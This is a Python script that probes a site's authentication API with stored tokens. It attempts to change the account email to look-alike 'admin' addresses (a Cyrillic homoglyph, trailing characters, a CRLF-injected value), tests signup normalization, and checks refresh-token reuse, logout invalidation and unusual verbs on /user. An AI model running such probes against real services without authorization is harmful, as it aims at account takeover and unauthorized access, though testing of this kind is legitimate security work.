import ssl, json, urllib.request, urllib.error, urllib.parse, time, base64, sys
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

ctx = ssl.create_default_context()
KEY = "<publishable-key>"
SUPA = "https://cdn.onlyfakeai.ru"
tokrec = json.loads(open("token.txt", encoding="utf-8").read())
TOK = tokrec["access_token"]
RT = tokrec.get("refresh_token")

def req(method, url, body=None, token=None, extra=None):
    h = {"User-Agent": "Mozilla/5.0", "apikey": KEY, "Content-Type": "application/json"}
    if token: h["Authorization"] = f"Bearer {token}"
    if extra: h.update(extra)
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=30, context=ctx) as resp:
            return resp.status, dict(resp.headers), resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, {}, str(e)

def show(tag, st, hd, body, n=300):
    print(f"[{tag}] {st} :: {body[:n]}".encode("ascii", "backslashreplace").decode())

print("===== D. email-change normalization / uniqueness =====")
variants = [
    "\u0430dmin@onlyfakeai.ru",             # cyrillic a
    "admin@onlyfakeai.ru ",                  # trailing space
    "admin@onlyfakeai.ru.",                  # trailing dot
    "admin@onlyfakeai.ru\r\n",
    "admin@onlyfakeai.ru+x@onlyfakeai.ru",
]
for em in variants:
    st, hd, b = req("PUT", SUPA + "/auth/v1/user", {"email": em}, token=TOK)
    show("PUT email -> " + repr(em), st, hd, b, 220)
    time.sleep(1.2)

print("\n===== D2. signup normalization vs our own registered email =====")
our = "rat4080probeewb44z@gmail.com"
for em in ["RAT4080PROBEEWB44Z@GMAIL.COM", "rat4080probeewb44z@gmail.com ", " rats4080probeewb44z@gmail.com"]:
    st, hd, b = req("POST", SUPA + "/auth/v1/signup", {"email": em, "password": "Xr9!kQ2#mZ7$pLw1"})
    show("signup " + repr(em), st, hd, b, 220)
    time.sleep(1.0)

print("\n===== E. refresh token rotation / reuse (fresh login via refresh of original) =====")
st, hd, b = req("POST", SUPA + "/auth/v1/token?grant_type=refresh_token", {"refresh_token": RT})
show("refresh #1", st, hd, b, 240)
rot = {}
try:
    rot = json.loads(b)
except Exception:
    pass
oldrt, newrt, newat = RT, rot.get("refresh_token"), rot.get("access_token")
print("rotated:", bool(newrt), "| new access:", bool(newat))
time.sleep(1.5)
if oldrt:
    st, hd, b = req("POST", SUPA + "/auth/v1/token?grant_type=refresh_token", {"refresh_token": oldrt})
    show("REUSE old refresh", st, hd, b, 300)
time.sleep(1.5)
if newrt:
    st, hd, b = req("POST", SUPA + "/auth/v1/token?grant_type=refresh_token", {"refresh_token": newrt})
    show("rotate current refresh after reuse-detection", st, hd, b, 300)
if TOK:
    st, hd, b = req("GET", SUPA + "/auth/v1/user", token=TOK)
    show("GET /user with OLD access token (post-rotation)", st, hd, b, 160)
if newat:
    st, hd, b = req("GET", SUPA + "/auth/v1/user", token=newat)
    show("GET /user with NEW access token", st, hd, b, 160)

print("\n===== F. logout + token state =====")
tok = newat or TOK
st, hd, b = req("POST", SUPA + "/auth/v1/logout", {}, token=tok)
show("logout", st, hd, b, 160)
st, hd, b = req("GET", SUPA + "/auth/v1/user", token=tok)
show("GET /user after logout", st, hd, b, 160)
st, hd, b = req("POST", SUPA + "/auth/v1/token?grant_type=refresh_token", {"refresh_token": newrt})
show("refresh after logout", st, hd, b, 200)

print("\n===== G. self-delete / misc verbs on /user =====")
for m in ["DELETE", "PATCH", "POST"]:
    st, hd, b = req(m, SUPA + "/auth/v1/user", {"email": "x@y.z"} if m != "DELETE" else None, token=TOK)
    show(f"{m} /user", st, hd, b, 160)
    time.sleep(0.6)
